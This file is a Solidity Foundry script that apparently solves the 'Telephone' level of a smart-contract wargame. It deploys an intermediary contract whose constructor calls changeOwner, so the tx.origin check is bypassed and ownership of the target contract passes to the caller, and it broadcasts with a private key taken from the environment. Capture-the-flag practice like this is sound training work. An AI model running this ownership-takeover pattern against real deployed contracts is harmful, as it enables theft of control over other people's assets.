// SPDX-License-Identifier: MIT
// forge script script/Level04Telephone.s.sol -vvvv --tc Level04TelephoneSolution --broadcast
pragma solidity ^0.8.0;

import "../src/Level04Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermediaryContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract Level04TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0x5707C0291E94A6095B25fd2a4386858877459bAE);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before owner: ", telephoneInstance.owner());

        new IntermediaryContract(
            telephoneInstance, vm.envAddress("MY_ADDRESS")
        );

        console.log("After owner: ", telephoneInstance.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}